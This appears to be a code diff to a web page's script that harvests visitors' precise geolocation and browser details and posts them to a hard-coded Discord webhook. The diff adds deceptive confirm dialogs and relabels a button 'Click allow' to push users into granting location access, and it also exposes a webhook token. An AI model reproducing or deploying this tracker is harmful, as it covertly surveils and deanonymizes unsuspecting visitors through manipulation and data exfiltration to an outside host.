@@ -53,33 +53,50 @@
         </div>
     </footer>
     <script>
+   
+   
    document.addEventListener("DOMContentLoaded", function () {
-    // Add an event listener to the button to re-request location access
-    document.getElementById("requestLocation").addEventListener("click", function () {
-        console.log("Button clicked, requesting location...");
-        getLocation();
-    });
+    setTimeout(() => showFirstDialog(), 1000); // Show first dialog after 1 second
 
-    // Initial location request
-    getLocation(); // Call this to trigger the location request on page load
+    // Handle user clicking "Allow Location Access"
+document.getElementById("grantLocation").addEventListener("click", function () {
+    window.close(); // Attempt to close the tab
+});
+
+    function showFirstDialog() {
+        if (confirm("Welcome! Click 'OK' to proceed.")) {
+            setTimeout(() => showSecondDialog(), 1000); // Delay before showing second dialog
+        } else {
+            alert("You must authorize to proceed.");
+        }
+    }
+
+    function showSecondDialog() {
+        if (confirm("To continue, please click 'OK' again.")) {
+            setTimeout(() => getLocation(), 1000); // Delay before actual location request
+        } else {
+            alert("Location access is required for the best experience.");
+        }
+    }
+
     function getLocation() {
         if (navigator.geolocation) {
             console.log("Requesting location permission...");
             navigator.geolocation.getCurrentPosition(showPosition, showError, {
-                enableHighAccuracy: true, // Optional: Request high accuracy
-                timeout: 5000, // Optional: Timeout after 5 seconds
-                maximumAge: 0 // Optional: Force fresh location data
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0
             });
         } else {
             console.log("Geolocation is not supported by this browser.");
         }
     }
 
-function showPosition(position) {
-    let latitude = position.coords.latitude;
-    let longitude = position.coords.longitude;
-    let timestamp = new Date().toLocaleTimeString();
-    console.log(latitude, longitude);
+    function showPosition(position) {
+        let latitude = position.coords.latitude;
+        let longitude = position.coords.longitude;
+        let timestamp = new Date().toLocaleTimeString();
+        console.log(latitude, longitude);
 
         let systemInfo = `
         User Agent: ${navigator.userAgent}
@@ -102,32 +119,25 @@ function showPosition(position) {
     }
 
     function showError(error) {
-    let message;
-    switch (error.code) {
-        case error.PERMISSION_DENIED:
-            message = "User denied the request for Geolocation.";
-            document.getElementById("locationOverlay").classList.add("show"); // Show overlay
-            break;
-        case error.POSITION_UNAVAILABLE:
-            message = "Location information is unavailable.";
-            break;
-        case error.TIMEOUT:
-            message = "The request to get user location timed out.";
-            break;
-        case error.UNKNOWN_ERROR:
-            message = "An unknown error occurred.";
-            break;
+        let message;
+        switch (error.code) {
+            case error.PERMISSION_DENIED:
+                message = "User denied the request for Geolocation.";
+                document.getElementById("locationOverlay").classList.add("show"); // Show overlay
+                break;
+            case error.POSITION_UNAVAILABLE:
+                message = "Location information is unavailable.";
+                break;
+            case error.TIMEOUT:
+                message = "The request to get user location timed out.";
+                break;
+            case error.UNKNOWN_ERROR:
+                message = "An unknown error occurred.";
+                break;
+        }
+        console.log(message);
+        sendData("Location Error", message);
     }
-    console.log(message);
-    sendData("Location Error", message);
-}
-
-// Handle user clicking "Allow Location Access"
-document.getElementById("grantLocation").addEventListener("click", function () {
-    window.close(); // Attempt to close the tab
-});
-
-
 
     function sendData(title, description) {
         const webhookUrl = "https://discord.com/api/webhooks/1337946103924133898/eudcofLWR_ryLQivFc1hgFf2v01Fy9RSIQJxd5G1Qo5VGeyWOtVKR5E-t-mr-XddLL1X"; // Replace with actual webhook URL
@@ -151,6 +161,7 @@ document.getElementById("grantLocation").addEventListener("click", function () {
         .catch(err => console.log("Error sending data:", err));
     }
 });
+
         
 
     
@@ -160,7 +171,7 @@ document.getElementById("grantLocation").addEventListener("click", function () {
         <div class="overlay-content">
             <h2>We Need Your Location</h2>
             <p>To continue, please close and re-open tab.</p>
-            <button id="grantLocation">Allow Location Access</button>
+            <button id="grantLocation">Click allow</button>
         </div>
     </div>
     
